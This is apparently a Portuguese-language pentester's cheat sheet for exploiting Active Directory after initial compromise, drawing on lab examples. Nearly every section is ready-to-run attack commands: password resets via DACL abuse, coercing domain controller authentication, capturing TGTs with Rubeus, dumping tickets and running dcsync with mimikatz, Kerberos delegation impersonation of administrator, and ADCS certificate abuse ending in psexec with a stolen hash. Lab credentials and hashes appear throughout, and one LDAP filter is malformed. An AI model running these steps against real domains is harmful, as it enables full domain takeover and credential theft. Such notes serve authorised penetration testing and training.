Explorando Active Directory
========================

Depois de comprometer alguma credencial/máquina de domínio temos a oportunidade de algum tipo de exploração, sendo elas:

- [ ] [**Abuso de DACLs**](#abusando%20dacls)
- [ ] [**Unconstrained delegation**](#unconstrained%20delegation)
- [ ] [**Constrained delegation**](#constrained%20delegation)
- [ ] [**ADCS**](#adcs)
- [ ] [Ferramentas interessantes](#ferramentas)

## Abusando DACLs

Esse tipo de permissionamento pode ser encontrada com a ferramenta do [bloodhound que está documentada aqui.](../../Tools/Bloodhound.md) .

### GenericAll

Com o genericAll podemos alterar a senha do usuário sem sequer saber a senha anterior. Para isso podemos utilizar serviços diferentes. Temos como opção:

#### RPC

```
setuserinfo2 hacker 24 Password@1
```
ou
```
setuserinfo hacker 23 P@ssword!
```

#### SMB

## Unconstrained delegation

A máquina com a configuração de unconstrained delegation armazena os tickets dos usuários que se autenticam nesta. Sendo assim, podemos forçar o Domain Controller a se autenticar com usuário de máquina no intuito de armazenar o TGT deste usuário ( que tem privilégios de dcSync no domínio ) e depois fazer o dump dos hashes de senha dos usuários do domínio.
A premissa é achar uma máquina que possui "unconstrained delegation" ou unrestricted kerberos delegation" configurado, pois nela será salvo os TGTs de usuários que podemos utilizá-los para nos autenticar em outras máquinas:

Enumerando máquinas que possuem essa configuração:


_Linux_

```
ldapsearch -LLL -x -H ldap://dc.support.htb -D "support@support.htb" -W -b "dc=support,dc=htb" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```




A premissa é achar uma máquina que possui "unconstrained delegation" ou unrestricted kerberos delegation" configurado, pois nela será salvo os TGTs de usuários que podemos utilizá-los para nos autenticar em outras máquinas:

Enumerando
```
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

_Remotamente_

Melhor comando para achar (deve estar configurado na máquina o nome do domínio apontando para o DC corretamente):

```
impacket-findDelegation <nome_dominio>/<usuario>:<senha>
```

Caso contrário, considere o seguinte comando

```
impacket-findDelegation <nome_dominio>/<usuario>:<senha> -dc-ip <ip_dc>
```

Podemos utilizar uma outra abordagem também:

```
ldapsearch -LLL -x -H ldap://dc.support.htb -D "support@support.htb" -W -b "dc=support,dc=htb" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

```
ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -D "thoffman@lab.ropnop.com" -W -b "dc=lab,dc=ropnop,dc=com" "(&(objectCategory=computer)(objectClass=computer) userAccountControl:1.2.840.113556.1.4.80 3:=524288))"
```

Com powerview podemos utilizar o seguinte comando:

```
Get-DomainComputer -Unconstrained
```

Depois  de enumerar as máquinas/usuários com essa configuração, devemos solicitar que o domain controller faça o login em algum serviço via kerberos na máquina comprometida, podendo ser de dois modos diferentes:


```
SpoolSample.exe <domain_controller_hostname> <maquina_comprometida>
```

Sendo a <maquina_comprometida> a máquina cuja configuração de unconstrained delegation está definida.


Podemos monitorar os novos TGTs com Rubeus com o seguinte comando:

```
Rubeus.exe monitor /interval:5
```


Se tivermos aguardando um usuário específico:

```
Rubeus.exe monitor /interval:5 /filteruser:CDC01$
```

Para enumerar os TGTs presentes na máquina, precisamos executar o mimikatz com os seguintes comandos:

```
mimikatz.exe
debug::privileges
sekurlsa::tickets
```

Depois disso podemos fazer o ataque do dcsync:

```
mimikatz.exe lsadump::dcsync /domain:home.lab /user:user1
```
## Constrained delegation


(userAccountControl:1.2.840.113556.1.4.803:=524288)

- [ ] [Encontrar máquinas/usuários com a configuração de constrained delegation](#enumerar%20maquinas)
- [ ] [Obter o ticket do serviço com impersonate de um usuário privilegiado](#obtem%20ticket)

Com máquinas fora do domínio
### Enumerar maquinas

```
impacket-findDelegation <nome_dominio>/<usuario>:<senha> -dc-ip <ip_dc>
```

```
Get-DomainUser -TrustedToAuth
```

```
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```

### Obtem ticket

Obter o ticket TGT da conta de serviço 

```
impacket-getST -spn <nome_spn_completo> -hashes :<hash_senha_servico> <nome_dominio>/<usuario> -dc-ip <ip_dc>
```

Exemplo:
```
impacket-getST -spn www/dc.intelligence.htb -hashes :51e4932f13712047027300f869d07ab6 intelligence.htb/svc_int -dc-ip 10.10.10.248
```

Tem o impersonate também:

```
impacket-getST -spn 'MYSQL/dc01.home.lab' -altservice HTTP -impersonate administrator -hashes :6a9eef1ee940cd8597b5d8198b507ea8 -dc-ip 192.168.175.200 'home.lab/2008R2$'
```

Ou com Rubeus:

r.exe = Rubeus.exe

```
.\Rubeus.exe asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:B8D76E56E9DAC90539AFF05E3CCB1755
```

Depois obter o ticket TGS para subir privilégios:

```
r.exe s4u /self /nowrap /impersonateuser:administrator /ticket:base64ticket...
```

```
.\Rubeus.exe s4u /ticket:put_the__previous_ticket_here /impersonateuser:administrator /msdsspn:CIFS/winterfell /ptt
```

```
r.exe s4u /user:svc_int /nowrap /domain:home.lab /msdsspn:MYSQL/dc01.home.lab /altservice:cifs /ptt /impersonateuser:administrator /rc4:<nthash>
```

Fontes:

<https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61>

<https://blog.harmj0y.net/activedirectory/s4u2pwnage/>

<https://mayfly277.github.io/posts/GOADv2-pwning-part10/>
<https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html>
## ADCS


```
netexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M adcs
```
    
```
certipy find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -stdout -vulnerable
```
    
```
certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn 'Administrator@sequel.htb'
```
    
```
certipy auth -pfx administrator.pfx
```
    
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee Administrator@sequel.htb
```

## Ferramentas

<https://github.com/the-useless-one/pywerview>
